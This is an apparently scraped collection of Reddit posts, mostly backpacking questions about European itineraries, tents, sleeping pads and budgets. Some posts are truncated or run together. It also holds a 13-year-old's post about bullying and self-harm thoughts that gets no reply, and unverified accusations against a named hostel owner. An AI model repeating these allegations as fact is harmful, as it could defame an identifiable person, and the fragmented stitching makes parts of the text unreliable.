I  should be able to finish the hike regardless, but I don't want to be the person slowing everybody down.

Please help me with my Europe trip plan/itinerary! :),"Hi , thank you in advance for your time!

I am a 27 year old female, planning to travel alone for about 6 weeks (last 2 weeks - Greece, Turkey with my bf)

I have drafted up a rough itinerary below - could you please let me know your honest thoughts, opinions and any advice please? I have included rough commute times too to each place, and anywhere there is a longer commute time I have designated a full day for travel. I will have a car in the south of France and in Turkey.

Also in terms of budgeting. I have set aside $200 NZD **per day** (125 euros), and I am bringing over $3000 NZD as a buffer (1875 euros, on credit card). Is this enough?

It is my first time in Europe, I am happy to stay in a mix of nicer hostels and cheap air bnbs, I don't want to stay at the cheapest/crappiest hostel everywhere I go, but I am not expecting 5 star hotels either!

I eat around 2 meals a day, and I won't be spending a large amount on expensive activities - skydiving, helicopter rides, hot air balloons, private tours etc anything of the sort! Mainly just sightseeing, few museums, few tours, food, markets, walking, beach, that sort of thing.

I Hug The Clothes In My Closet,"Do you ever feel like your friends don't actually like you?

Is it weird I want comfort?

I feel like none of my friends like me, they act like I'm not real **until** their favorite person is gone. They treat me so shitty when I'm near them like, when I'm about to sit down they pull the chair, when I'm telling them something they give me a short and simple answer like 'cool' or 'k'. It makes me overthink so much, being 13 seems so easy.. But it real isn't, to be honest it feels like a noose is always around your neck and one simple mistake, is always a small step to hanging. 

The comfort of my **friends** seems so.... dull, careless and empty. 

So I hug the clothes in my closet, it gives me more comfort when you hug something that doesn't push you away and tell you to just deal with it. Even my parents seem so uncomforting. 

What do I do when the thoughts of hurting myself come in, I know for sure I can't tell my friends because they'll tell me I'm attention and tell the other's how much of 'attention whore' I am.

Most battery efficient way to GPS track over long periods of time?,"Recording my GPS track is very important to me. My phone (Samsung J6, 3000mAh) is fine for day hikes (I don't turn off anything to optimize), I would estimate gets me maybe 14 hours of GPS tracking if I don't use it for anything else other than strava tracking and the occasional map check

Obviously unsustainable over multi day trips, but I still want to record GPS. How do I extend this? 

I know plane mode helps a little. 20k mAh powerbank might get me a week of that IF i don't check map, internet, or take photos (which I still want to anyway).

Are smart watches the way to go? Optimized phone with a simpler GPS tracker that I then export to strava once I get home? 

Probably don't want to blow 800 on a Fenix 7 although I know the battery is incredible.

Powerbank plus GPS watch? (amazfit stratos 3?) Can I expect up to a month with a watch and 15000 mAh powerbank?

"Confused about protecting my new tent, ground sheets, footprints and tyvek","I have a piece of tyvek to put under my tent and was watching a YouTube video of how to use it correctly the person said it's used to protect the ground sheet. 

Does this mean if I want to look after my tent and get as much use out of it I can I'll have to buy a footprint to put under my tent and then put the tyvek under that?

If a footprint/ground sheet is an essential part of a tent why on earth do tent manufacturers not build them into the tent. They weigh next to nothing, 200 or so grams is irrelevant when taking into consideration the total pack weight.

My tent is the most expensive and important part of my kit yet they don't even come with a floor that can handle little rocks and sticks, it's insane. I feel like the cult of the obnoxious ultralighters has ruined so much equipment. Manufacturers are taking off a tiny bit of weight to sacrifice any notion of durability.

 The lack of durability I believe is planned obsolescence and the fact you need to buy all the bells and whistles if you want a functional tent is just a way to squeeze some extra cash out of their customers pockets.

 I used the same tent for 15 years and never had any major issues only minor repairs from normal wear and tear.  Unfortunately I had to retire my trusty steed as the family is growing in numbers. I looked online read lots of reviews and slpashed out some serious $ for what I thought would be a durable high quality tent to last another 15 years. My new tent came with 4 pegs and half the guylines. I had to purchase pegs and guylines to even use my brand new tent and now I may have to buy a footprint too, I can't believe it.

Any way rant over, is there anything I can do to the tent before using it to increase its durability and lifespan?

Bag or Bags?,"Hello everyone!

I'll be backpacking around Europe for 70 days and I've yet to decide on the type of bag or bags that I should be carrying. 

My itinerary is somewhat of a good mix of cities, hiking, and small towns. Doing the typical Munich -&gt; Salzburg -&gt; Vienna -&gt; Budapest... but mainly, will be travelling across Italy starting from Ancona (ferry from Croatia), down all the way to Naples and then up all the way to the Dolomites. I'm welcome for any critiques for this part too. 

My current plan is to use my 20L Peak Design Everyday backpack as a daypack and buy an Osprey Atmos 50AG. I know I would look extremely silly and be in extreme discomfort but I cannot think of an alternative. I'm an amateur photographer, that is why I need a 20L daypack to store my camera and 2 lenses. Also, carrying the camera on my neck is an option however I'd like to keep it in my bag in shady places. I believe a young Chinese in a small Italian town is hell of a juicy target. 

Would appreciate if you could give me some options and advice. Thank you!!!",backpacking,1649040605

Questions About Backpacking Through Europe,"**A bit of background:**

I am 24 years old and I just recently went through a breakup of 4.5 years last month and I am struggling to find purpose in my life. I work at an office job that doesn't pay well and is not fulfilling. Ever since I studied abroad in Italy for a month in 2019, I have loved the idea of traveling. In the summer of 2020, I planned to backpack through Europe during the Euros with my then SO, which obviously fell through because of Covid. 

Once my lease ends in July, I am wanting to quit my job and book a flight to Europe by myself while meeting people of all different cultures and discovering my sense of purpose. I don't want to do touristy attractions or cities as I want to visit villages and stay at family-owned hostels that are more authentic. 

**My questions:**

What countries would you recommend to go to within Europe that are affordable? I don't have a ton of money but am willing to travel as cheaply as possible.

Will I be screwed in the job market when I come back?

How realistic is this to go by myself and be able to meet people and share experiences?

What should everyone know about carry on luggage?,"Hi, guys! I'm working at the airport and, obviously, all my friends, relatives, acquaintances, etc., always call me regarding any question when they plan a trip. The more frequent questions are about carry-on luggage, as I've noticed. Thus, I've decided to write this post covering the main rules for cabin luggage.

So let's start!

It's strictly forbidden to bring the following items on board:

weapons and similar items (for example, toy guns and souvenirs),

explosives and flammable substances,

piercing and cutting objects with a blade length of more than 6 cm (although some airports prohibit any blades),

liquids with a volume of more than 100 ml.

About liquids, it's worth saying separately. These include water and shampoos, creams, gels, toothpaste, and even soft cheeses, in a word, everything that can be spread. All of them can be carried in hand luggage exclusively in containers with a maximum volume of 100 ml.

The only two exceptions to the """"liquid"""" rule are special (including baby) food, necessary for the passenger on the road, and medicines. They cannot be put in a measuring bag but transported separately and must be presented at the control. However, in the case of transporting large amounts of medicines, a prescription from a doctor may sometimes be required, so I'd recommend taking it with you to the board.

I always have to answer whether it's possible to carry food in hand luggage. There is no special restriction for this, but it's worth remembering the rule of carrying liquids, which will immediately exclude any drinks, yogurts, mousses, and similar products with more than 100 ml.

Just yesterday, I got a question from my friend about a sample that was taken from his hand in the control zone. It's about a test, the purpose of which is to detect remnants of explosives on the body of people and objects. Don't worry! Taking this sample doesn't mean that you did something wrong. In most cases, it's a selective control.

I hope this post has been useful for you. If you have other corners while packing your carry-on luggage, be free to comment on them.",backpacking,1649011659

Backpacking for camping: 48l or 65l bag?,"Hi everyone! This summer I'm planning on camping in meditterean Europe (so a warm climate) with someone else. As I have to buy a tent, sleeping gear and a backpack, I would love to get some advice on how to make a future proof and sustainable choice. I am willing to invest some money in good gear, but I wouldn't want to have to replace it in a few years already (except for a warmer sleeping bag for colder climates). 

We are going to stay at campsites with facilities, so no need to pack water filters, days worth of food, etc. We will be traveling from camping to camping with public transport mainly, so no more than 2 hours of hiking a day with all the gear. However, next year we might be wanting to do the same thing in Scandinavia where it's considerably colder. Will a 48l backpack be enough for both use cases? What do you guys think?

See my lightperpack link for what I would bring, splitting the weight of the tent and cooking gear with my partner (I know there's quite some 'luxury' items on there, but I would love to bring them). I got advice in an outdoor store and the Bach Journeyman 48l was of good quality and fit me extremely well. The alternative would be a Bach Lite Mare 65l, but as it's considerably more expensive, I'm unsure.

TLDR: Will a 48l bag be enough to carry all of this, and also be enough to carry warmer clothes &amp; a warmer sleeping bag etc for a colder climate in future camping years? Or would it be better to buy a 65l for all future backpacking/camping trips?

I have bought tons of gear and now I am ready to hit the trails.

I am looking for destination and trails in Europe where I could fly in, travel to the trail head, hike and wild camp.

Is there an online source that has information on trails? where do I start? 

Do you have any recommendations?",backpacking,1648826722

Food for +7 day backpacking tour in the mountains,"I’m planning a backpacking trip soon with someone that never went backpacking. Only problem is that she’s allergic to nuts and doesn’t eat cheese. For me, my diet on backpacking trips consists mainly out of cheese and nuts. She’s also allergic to red fruits. I’m wondering what type of food to advise her on bringing, dried meet is of course a given, but anything else anyone can suggest for breakfast and lunch? For dinner the freeze dried food will have some possibilities without nuts and cheese so that’s not so much of an issue, mainly lunch and breakfast.

Obviously, since it’s a long trip (I’m taking her on an easier shorter trip before exposing her to the magnificence of the mountains of course) weight and size of the food is important. As I mentioned, mainly breakfast and lunch are what I’m struggling with for her.

Ps. I posted this question on the beginner question thread as well, but I’m hoping for a bit more input here. Though I do appreciate u/Argonians4Ukraine’s reply there and want to share this user’s response:

Seeking advice - Question about using a summer sleep system in possible winter conditions.,"Is it possible to jerry rig a 55 **°** F(13 **°** C) (comfort level) Sleeping Bag + an R1.4 sleeping pad in possible  32 **°** F(0 **°** C) - 20 **°** F(-6 **°** C) weather? 

Some ideas I have so far are:

1. Bringing a rubber hot water bottle that I can stuff in my sleep bag to add heat all night. 

2. Using an intense sleeping bag liner / jungle blanket. (any recommendations on one would be amazing).

3. Stuffing hot rocks near/under the tent. 

I have a 3 day backpacking trip planned for the Catskill Mountains of New York next weekend. The weather report at ground level says it will be within the range of my sleep system. However the hike will take us along an exposed ridgeline for \~20 miles/32km  where we will be at elevations of 4000ft/1220m  above start .... and because it's early Spring and there is a slight chance the weather may drop to 20F/-6c. 

We are trying for ultralight and I will be using either a REI FLashAir2 tent or my bug out bivy. 

Short of buying a new 3 season bag and an r4 sleeping pad---budget is tight---does anyone have any ideas? Is my plan malarkey?  Has anyone pulled this off without terrible suffering?

Poor Man's Thermarest Compressible Pillow,"I was looking at buying a compressible pillow because those inflatable ones are awful. If you add too much air  it is too hard; add too little and your face is enveloped and you can't breathe. Plus, the noise every time you turn!   


So after many reviews, I realized that I needed to by a compressible pillow. There may be other brands, but if there are I haven't seen any. First, if you decide to buy one, they have them on sale through a couple websites as low as $20 for a medium. Amazon is $52, so stay away from them on this one.  


But for my normal house pillows I bought ones where it came with extra fluff (DreamyBlue is the brand I purchased for about $60). The fluff already included was too much, so I pulled some out. I now have enough for my pillow at night as well as I have enough extra to make my own camping pillow. 

&amp;#x200B;

I got two throw pillow covers (just basic blue) for $5 and used my extra fill to create my own camping pillow. Weighs about 350g, but could cut more weight if I used a thinner pillow case. I compresses down to the size of about a large Nalgene (or two coffee cups stacked on top of each other).  


So it may not be economical to go buy a $60 pillow to save $20 on a camping pillow, but if you're looking for a new pillow anyways, or have some extra fluff lying, something to think about. Alternatively, you can buy 5lbs of shredded memory foam for about $30, which would be enough to make two if not three pillows.",backpacking,1648753552
Solo Backpacking in Turkey for 2 Weeks,"Hey! I'm a 22M looking for my first solo travel experience in Turkey

I have never been to Turkey before so please feel free to let me know what you think about these places as well as recommend me some more

Regarding my interests, I like nature and exploring the culture (experiencing new things). Don't prioritize nightlife that much but ""a little party never killed nobody"" isn't that right? So far I have only eared of the Hamam and a food tour but let me know what you recommend best.

I am also doing this travel on a budget so looking for some cheap (but decent) hostels but I am planning on spending about 600 Euros during the 14 days. Do you think that is reasonable for everything including stuff like transportation, food, and maybe a hot air balloon trip?

Finally, I also like meeting new people so what's the best (and safest) way to connect with locals? Is Couchsurfing a good option there?

Where do I park?,"OK, so this might be a dumb question:

So, I am no stranger to backpacking, but recently I have wanted to get off the trail. From my understanding, all land owned by the BLM is free for hiking and camping so long as you don’t sit in one place for too long. I am not sure if I am right about that, but it’s what I have heard. 

If that is true, where do I park my car if I want to backpack in the middle of nowhere on BLM land? Is it allowed to just park on the side of the road if I am backpacking for the weekend and there is no town for miles? 

Thanks in advance!",backpacking,1648606199

Can you manually shorten an inflatable sleeping pad?,"Looking to save weight, and it always bothered me that my sleeping pad (Nemo Tensor Ultralight) is 72"", and I could cut nearly a whole foot off and still be comfy.

I did look at the Therm-a-Rest NeoAir XLite for Women, which is 66"", but I find this one more crinkly personally, and 66"" is still bigger than I need.

Is there anyway to cut an inflatable sleeping pad and then refuse it together? Is this a terrible idea?",backpacking,1648588986

Best free-standing ultralight tent?,"I love to solo hike, primarily in the Sierra Nevada region. I'm looking for an ultralight tent that is free-standing.

Since I backpack a lot in very rocky places, and I am also impatient, I'm looking for a lightweight, quality tent (ideally 1P) that is free-standing.

She did incredibly well , and seemed to love having a job to do. Started quite light for her and only did about a 2hr to the camp location.

I have been wild camping a while but this was my first camp with Kono, wasn't sure how she would get on through the night so I ended up sleeping with the inner door open all night so that she could still see me and I could keep an eye on her. She did amazing though and was rather chilled about everything, even with the wind flapping the tent around in the early hours of the morning.

Can you bend an internal frame to make more headroom?,"Hi all,

I bought a used early-90s Gregory 80L pack recently. The frame is size L and I have a short torso so the shoulder straps are a little high for me. At the shortest adjustment, the internal metal frame is so high that it pokes at my head and precludes any kind of headgear. Would it be possible/advisable to bend or cut the frame so that I can have shoulder support and headroom? It's a really great old pack so I don't want to ruin it unnecessarily, if it won't work out I'd rather just resell it.

Hiking Shoe recommendations for foot pain?,"My boyfriend and I have historically worn Salomon trail runners (Sense Ride 3 currently) for our day hikes (up to 20 miles), and they've been great. However, we've started backpacking recently, and he always develops foot pain sometime on day 2 or 3 of our hike. We suspect it must have something to do with the extra weight he's carrying (between 20-30 lbs), and as such, we're thinking about replacing his trail runners with some hiking shoes/boots that can help him carry that weight more easily.

Any recommendations? The pain seems to be dispersed generally throughout his feet, but his arches seem to hurt the most. He already uses the Superfeet green insoles; we tried the ones specifically for hiking, and he liked the regular green ones better. Should he go for more cushioning (e.g. Hokas)? Or should he go for a stiffer sole? Anything else we should consider? Thanks!",backpacking,1648512369

Predatory hostel owner in Tirana,"I am making this post to warn other travelers against staying at the English Hostel in Tirana, Albania. The owner is an American expat with a terrible drinking problem who habitually uses his power to be creepy towards young men and women who pass through. Usually, this is in the form of odd comments he makes toward women. 

I worked there for about 5 months as a volunteer and was personally groomed into participating in a variety of very risqué photoshoots (he is a big BDSM fan and basically convinced me to get the s**t best out of me by a young female employee of his who is also being taken advantages of IMO) at the behest of the owner, who is in his mid 60’s and finds great sexual gratification in watching young people enact his fantasies. I have witnessed him try to persuade young, vulnerable travelling women to participate in photoshoots (less extreme but still very sexualizing) as well on multiple occasions. 

While generally safe for young men (myself being a rare exception as I spent so much time there), I HIGHLY recommend women do not stay here for safety reasons. 

I am currently in the process of filing reports against the owner with Hostelworld and Booking.com.",backpacking,1648509311

I’d have my medical history from my GP as well as confirmation of my diagnosis and current meds, but what would I need to do in Aus to continue to get my meds? Would it be a GP, psychiatrist etc?

Travelling solo brings the best experiences and people,"This summer, I've been on a trip to Las Vegas on my own. I felt like I had to get out of my comfort zone and do something big. I've never travelled on my own, let alone do something without being influenced by the decisions and thoughts of others. But I did this one thing, and it turned out to be the best thing I've ever done in my life.

I've spent my week at Caesar's Palace. I'm fascinated by ancient Rome, so I didn't hesitate when I booked my room. The first day started off pretty peculiar, but I went out to meet people as the night approached. There was a party at the infamous club OMNIA, and of course, I went there. I've seen soo many people, all of them were so well-dressed. As a European, I was surprised that they wouldn't let just anyone inside. You'd also have to wear long pants; otherwise, there was no chance of going in. I remember seeing a young man angry by the fact they didn't let him inside because of his shorts.

Anyway, I was out all night, but the highlight of the night was when I saw this dude hit the jackpot. As soon as I got out of the club, I saw this man with a brown leather bag, screaming and putting the money inside it. The atmosphere was so nice, and everyone felt so happy for him. He saw me standing there watching him, shocked, and came to give me around $300. 

It was a very nice and impressive experience so I wanted to share it with you, guys. But that man who shared his winnings truly made my day because if I had been in my country, they would give you a deadly stare and run with the money. I'm not joking.

Do you guys have any tips to where and how to meet new people?

As i mentioned, the trip will potentially last from mid april to mid-may. Unfortunately I won’t be able to make my trip in the summer.

Why I'm happy I invested in a good travel insurance 🚨,"Since I left home around 4,5 months ago.

I, unfortunately, had several opportunities to test the credibility of my travel insurance.

&amp;#x200B;

**Hopefully, my story will promote the idea of you buying an insurance if you:**

\- Sometimes skip it  
\- Are still considering it  
\- Or if just want to be happy that you already decided investing in one...

&amp;#x200B;

**Claims on my current trip:**

1. Covid-19 infection (Thailand)

PCR test, 10 days of hotel quarantine including food and mandatory Andrographis paniculata tablets, and a doctor certificate.

**Costs:** 38.783 THB ($1.154 USD) + Around $100 USD worth of food  


2. Dog bite from a stray dog (Thailand)

Cleaning of wound and two rabies vaccines.

**Costs:** 5.310 THB ($158 USD)  


3. Dislocated shoulder (Thailand)

I checked in at a new hostel, where the external heater was a bit tricky. So I got burned while having soap under my feet, which made me fly mid-air and land on a straight arm (this one was painful!).

Ambulance, X-rays, painkillers (morphine, etc.), 1 x day at the hospital, slings, and more meds.

**Costs:** Approx. 50.000 THB ($1.487 USD) *- this one was paid directly, so I don't know the exact costs.*  


4. Ear infection aka Swimmers ear (Thailand)

Doctors fee and two bottles of antibiotic ear drops.

**Costs:** 3.639 THB ($108 USD)  


5. One-day luggage delay (Turkey)

Due to the very limited amount of underwear in stock, and cold weather without my jacket, I invested in just that.

**Cost:** 2.118 TRY ($142 USD)  


6. This includes 5-10 online consultations with doctors back home for second opinions and follow-ups. This was particularly helpful due to the language barriers. 

**Cost:** 1.725 DKK ($254 USD)  


**Total costs:**   
$3.403 USD

**Cost of insurance:**   
$641 USD (no excess fees)

**Total money saved:**   
$2.762 USD (plus I'm still having around 3 months left of insurance)  


So if you're just half as unlucky as I've been, it would still be worth your investment along with the peace of mind :-)",backpacking,1648401014
"Salmon Creek Trail to Estrella Camp, Big Sur, Ca","[Cover Pic](https://i.imgur.com/RggRso8.jpg)

Decided to hit Big Sur over my spring break and chose to hike out to [Estrella Camp on the Salmon Creek Trail](https://i.imgur.com/Jf97sKO.jpg). It's about 3.5 miles out and just fyi it's basically uphill the entire way. Took us about 2 hours moving time to get out there. We headed out Wednesday around noon and saw a dozen or so other groups along the way (including day hikers) so I imagine the trails pretty busy weekends n such.

[There's some signage about bears in the area](https://i.imgur.com/JhYzzbK.jpg) but it's dated about a year ago soooo yeah. My bear vault is dialed into my loadout so it comes along whether it's needed or not, but the majority of the people we came across had vaults as well.

The trail goes through the [Silver Peak Wilderness](https://i.imgur.com/5ZTD62a.jpg) and is well maintained and covered for most the way. First mile or so is exposed though. After which there's a little spot you could setup camp if you wanted and brought plenty of water. [We stopped for a coffee break](https://i.imgur.com/CbpUkfB.jpg) **IIRC you don't hit any water till you get to Spruce Creek Camp so be sure to bring some for the trek.** There might have been some pretty views along it but... [yeaaah. Fogs pretty though, I suppose](https://i.imgur.com/FMbcWlw.jpg)

We took a break at Spruce Creek Camp which seems to be a popular site for day hikers. Camp has two established sites with the creek separating them. No tables or anything like that but each spot had a rock ring and plenty of room for multiple tents. On our way in some dudes were occupying one of the sites and the other was empty. On our way out (Friday) they were both taken.

Continuing on, you can here the roar of upper Salmon Falls when you get there. You can kinda see the falls and a large pool through the trees. Couple of different routes going do and they are all sketchy (heavy incline) so we opted to return packless for a day hike. 

Estrella Camp has 7 different ""sites"" to it. Two of which have tables. The first night there was a solo dude so [we made camp away from him](https://i.imgur.com/Px2MXW3.jpg). But he left the next day and we snatched his spot. [Probably one of the more centralized spots and there's a table so that's cool.](https://i.imgur.com/P3DbQLi.jpg) There's also a sign nailed to a tree stating that there's a toilet in the area. The lady said it was a pit toilet. Saw maybe 6 different groups hike through while we were there but only one made camp.

Originally we had planned to dayhike out to Lions Den Camp just to recon it but the other group that stayed said there was a bunch of groups occupying it (they had planned to stay their but continued on to Estrella). So instead we opted to go back and check out Upper Salmon Falls and I'm glad we did. Highly recommend it.

The path we found pops you out [on top of the falls](https://i.imgur.com/yovmkqT.jpg) but it's pretty simple to make your way down to [the lower area](https://i.imgur.com/JRfoelh.jpg). This place would be killer during summer for a swim spot. [We rock hoped up the river back to Estrella](https://i.imgur.com/i4vBnZG.png) and found a camp site just up river from the falls that isn't on any maps. There's a little piece of candy for those reading this and planning to hit this trail. As far as rock hoping back to Estrella, umm I probably wouldn't recommend it, lol. There was some sketchy parts. At one point we had to [climb a dead tree to get up](https://i.imgur.com/I6iJOMB.jpg) (which was actually fucking sweet tbh but generally dangerous and not recommended) and another spot I had to pull the lady up a rock (she smol) to continue. I also slipped on a soap rock and busted my ass and hand on some rocks so that was fun. Luckily the shoes dried by the next day.

Well... and that's that. Thanks for reading. 

Oh and fire restrictions where lifted as of Mar 1st but if you plan to burn, [don't forget to bring your shovel](https://streamable.com/dlaozd) It's literally one of the [questions when you get your permit](https://i.imgur.com/P6xyqPo.jpg) so yeah, suck it shovel haters...",backpacking,1648398014

"Please share your backpacking experiences and about how much it cost (USD, or I can use Google to convert it lol)","I’m currently in between jobs but have a good bit of money saved up and a job that will be hiring when I get back. I’ve never done anything like this; I’m from Texas and have driven (I’ve never flown) west to Vegas and East to Florida having visited most in between, and have taken two cruises, but that’s it. 

I know it’s impossible to put an exact number on it because of the many different factors - length, places visited, touristy things that cost money, etc. (not to mention the flight to and from Europe)

So rather than trying to put a price on a 2-3 week trip, I’d like to hear some of y’all’s experiences (length of your trip, places you visited, things you did, must sees/dos, etc.) and about how much it ended up costing you.

I have no idea where I would even start or where I would go, though depending on my route I do have a few ideas on certain things I would want to check out. I could probably afford to throw a little more into it, but I would prefer to keep it as cheap as possible, basically doing just a lot of checking out cities, eating the food (nothing close to fancy), exploring different areas that are free or cheap, maybe a few “tourist priced” things depending on where I go, and kinda doing whatever the locals do. Mostly cheap to free stuff.

So enough rambling - please share your backpacking stories or recommendations with a clueless first timer.

Help Me Pick a Suitable Sleeping Pad,"Hello all,

I have backpacked a few times and we cheaped out on a few pack items the first go-round just to see if we enjoyed the experience. Looking to upgrade because I had a hell of a time with my first sleeping pad.

I woke up every morning after about 6 hours with awful back pain (I have previously suffered from this so I'm a bit sensitive).

Existing Pad: [https://www.amazon.com/gp/product/B07FP4Z3RZ/ref=ppx\_yo\_dt\_b\_search\_asin\_title?ie=UTF8&amp;psc=1](https://www.amazon.com/gp/product/B07FP4Z3RZ/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&amp;psc=1)

Some details and questions:

1. My sleeping bag is the Nemo Forte 35. Is a mummy shaped pad suitable or do I need something more rectangular?
2. I'm 6'3"" but very skinny. My tent can accommodate long pads so no issue there.
3. I'm also looking for something that can reasonably be used for three seasons. I don't foresee myself having a lighter pad that is only for warm weather use to shave off a few ounces. So, R Value of 3 is where I'm thinking I'd land.
4. I am open to inflatable or not, but I think that inflatable is the way I'd tend to go.
5. Weight and packability to me is important, so would probably prefer &lt; 2 lbs if possible.

Pack advice for my gf???,"My gf and I are currently backpacking the Appalachian Trail. So far it’s been a wonderful experience save for her pack fit. She currently has an Osprey Aura AG 65. Problem is the pack keeps slipping. She has extremely large breasts and a lot of her weight sits on her belly. The pack slips and no matter how I adjust it it slides down and the chest strap ends up choking her.

Seeking suggestions for lesser known places in Europe for September!,"Hello! 27M here.
I’m visiting Istanbul for a wedding in the beginning of September and then planning a backpacking trip to Europe for a month. 

I’ve traveled solo quite a bit before (pre-COVID) and already been to Munich, Warsaw, Krakow, Prague, Budapest, Bucharest, Athens, Milan, Bergamo

So I wish to travel to some smaller lesser known locations/cities and I’d love to get some suggestions! (For eg: I loved Bergamo in Italy!)

I have a month on my hand. I don’t mind multiple countries or multiple places in the same country either. 

Side note: I’d prefer staying in hostels or couchsurf, and travel buses/trains—whatever is the cheapest local form of transport. I’m a typical budget backpacker hahah. 

Looking forward to the suggestions!

PS. I’m traveling after 2.5 years, and I can’t contain the excitement! If you’re in Europe in September as well, drop me a dm! Would love to meet people.",backpacking,1648256829

South America and Southeast Asia Questions… Advice Needed!,"Hey guys, I’m a junior in college graduating next year. Seeing South America or Southeast Asia has always been my dream. I am right now beginning the very start of my plans for a 6 month (slow travel so wouldn’t care if it ended up being 9+) backpacking trip in South America. If I did Southeast Asia, I imagine it would be shorter. I like to do things a little differently. While my friends studied abroad in Paris and Barcelona, I looked for programs in Asia and SA. However, this just never came to be with my credits and money. I was recently introduced to backpacking. I had always known what it was but had never really given it any thought. But, I’ve been watching so many videos, reading so many blogs, and I’m hooked. With that being said, if any of you could answer these questions and give me some advice I’d appreciate it so much. I tried to do alot of research before posting because I’m sure the same questions get repeated on this sub.

1. Which is better for a first timer? I’ve heard Southeast Asia has a younger backpacking crowd which may be better for me but really I’d prefer South America. Also, is part of the reason Southeast Asia is better because it’s smaller (comparatively) to an entire continent like South America?

2. Groups. I want an authentic backpacking experience. I do. But I’d really love to find some people to enjoy it with. I know when you go solo you meet people at the hostels and you hang out with them and everything which I am totally not opposed to but I would really really like to go with people. Is there anyone that knows of any kind of group to find this?

3. How much time in preparation for everything (finding people, visas, passports, etc) do you think I need? Also, how much would you say you spent on prep as I can’t find that anywhere.

4. I’ve read 1,000 budgets and I’m thinking to be safe I want about $1500 USD for every month and try to stay way under that. Does that sound good?",backpacking,1648221679
5 Offbeat Places to Visit in Mumbai,"# Mumbai Is the Maximum City

It is called maximum simply because everything happens to the maximum here— maximum fame, maximum money, maximum failure, and even maximum disappointment. The city is amiable because behind the cold, materialistic exterior lies resilient people, supporting, helping, and motivating each other in times of distress and whenever the city is under siege by anti-social elements.

And of course, one needs to be daring here to survive the maddening crowds, the rush-hour trains, and strenuous struggles every day to eke out a living and come out winning against all odds. The maximum city is just not everybody’s cup of tea.

# The Soul of Mumbai Isn't Found in Its Iconic Landmarks

That said, enough has been said and written about the iconic landmarks of the city like Marine Drive, the Gateway of India, or even Juhu beach. They are breath-taking and fantabulous, no doubt about it.

But if you happen to be one of those travelers who want to decipher the hidden soul of any city, you need to visit the unexplored, offbeat places where the city shows its true colors and vibrancy.

And here are five of the top offbeat places to visit in order to bring you closer to the soul of Mumbai.

How to plan once you return?,"Hi everyone. 

So come August I’m planning on quitting my job that I’ve had for a year since graduating college and traveling for 3 months. Honestly, the travel part isn’t what’s worrying me, but the return.

Is it worth quitting a job to travel for just 3 months and then most likely been unemployed for another 3 months once returning? I’ve never had a restaurant/ temporary work job, would it be difficult to find (I live in a major US city)? I’d also have to live with random people/ my parents. 

I’ve also considered extending my travels and ski bumming once I return, but again, I’m worried I won’t be able to figure this out in time because I’ll be traveling in the fall.

Yelled at on the trail for wearing camouflage. Am I the problem?,"Greetings fellow backpackers. Part of backpacking that I enjoy is gear and the thrill of trying something new. Over the last few years, I’ve started backpacking in camouflage. Not some average piece of surplus or my retired BDU’s (RIP), but high tech and effective camo. Finnish MO5 and Rhodesian Brush patters. I rig my pack up, using a sewing machine, with a pattern applicable to the trip (winter, woods, desert). I rig my dogs pack too. 

I find it fun to try and be invisible on the trail. I like researching available patterns and matching them to my trips environment. Just a side hobby. 

Anyway, during my most recent in the Superstition Mountains AZ, two separate people came up to me and started asking aggressive questions about “why do you have camo” and “playing military.” One even made a derogatory comment about white men (not sure why as I hadn’t even said anything). In these interactions, I said just liked camo and then politely asked to be left alone, which they eventually did. 

my question: 

Would it upset you that someone had their pack and outfit rigged with camo? 

Seems like it should be a live/let live scenario, but I don’t want to freak people out. I don’t care if people think I’m weird or dumb, but I also don’t want to ruin others trip. Open to criticism.",backpacking,1648152237

Not overly concerned with warmth as I’m purely using these as day time base layers and will have a fleece as well as an outer shell for rain. Any input in regards to how these compare, and what other options in this price range may even be better.

Any ideas for fun professional placements?,"Hi,

For background I am a 24 year old male studying for a PhD in bioinformatics/microbiology. I enjoy the outdoors, animals and am in good physical condition.

As part of the requirements for my PhD I must take part in a 3 month placement doing literally anything  except from sitting and working in a lab. It is funded ‘within reason’ by the university so this won’t be an issue, including international travel.

I feel I am in the fortunate position where I know the line of job I want in the future, have plenty of experience and will be walking into a very in-demand industry with good contacts. This puts me in a very ideal scenario where I can choose to spend this 3 month placement doing pretty much the most fun thing I could wish to do… my only problem is I am struggling for ideas.  

I would be looking to do something that when I’m older I can look back and think ‘wow what an incredible experience’. To give an idea of the sort of thing, in my undergraduate I took part in a field course where we went to the deserts of South America and carried out ecological mapping for a month. This would more than likely be solo travel, so ideally not something that would completely isolate me for 3 months straight! Ideally it would be nature/biology related, but more than open to any idea.

If you have any ideas, please let me know - or feel free to ask anymore questions! I plan to do this spring/summer next year but need time to plan and get it sorted.",backpacking,1648079714

First Time Backpacking! - Patagonia vs Buenos Aires?," Hello! I am new to posting on this subreddit, but I am a long-time lurker. My friend and I saved money from last December until now for planning a trip to Argentina. We researched different places to visit and still have not made up our minds on where to stay when we go there. While we have saved up enough money to have an enjoyable trip, our issue is that I love the city, yet he loves the outdoors.

I want to be able to do as much as possible on this trip and use it as an exciting bonding experience for both of us. I am a little worried about how we will get around if we choose Patagonia, although I'm assuming we'll rent a car.

Our overall goal is to see sights, meet spectacular people, and have an unforgettable experience that lasts a lifetime.

I also remember a documentary about a small community of tiny housed ""hippies"" living somewhere in Argentina. After searching, it seems as though I cannot find the source to identify which city the village is in. (If someone knows what I'm talking about, please let me know where it is!)

Before covid, my 2 year long stay in Australia was cut short to 2 months because of the pandemic. My friend managed to stay out there and returns this summer. We are now planning a trip to South America followed by SE Asia in august. This in return would use up all of my savings after the 8 months of travelling. 

I know South America would be great, but I didn’t get to experience all of Australia in full. I’m considering sacrificing our 4 months in South America to be able to go back to Australia on a WHV.

Need a new destination for a backpacking trip.,"I need a little help finding a new destination for an upcoming solo backpacking trip. My original location / route weather forecast is looking a little colder than what I either am prepared for gear wise or willing to deal with. Went from No to light snow to probable heavy snowfall. 

I already have a few back up areas planned out, but I figured I would ask here as well. 

Not looking to bag any peaks. Just looking for an area that has some nice mountain scenery. 

I am not tied to any specific location or even state. Just needs to be within about 22 hrs (2 days of driving from Dallas, TX). Looking for about a 20 to 35 mi route for a 5 day / 4 night trip for the week of 28 March - 01 April (with both weekends open for driving). 

My one main restriction is needing a trailhead that is not too difficult to access. So no roads that require 4x4, since I drive a small car with low ground clearance (Nissan 370Z). 

Looking forward to any recommendations y’all can make for back up locations.",backpacking,1647959541
2-3 night backpacking trip in the North East before I move West,"I've lived in NYC for many years, and it's time to move on.

Gear Quest(ion),"So, I like being prepared. Adaptable. Multi-functional. Most of all, educated.  
I'd like to know more about the stove fuel adapter game.

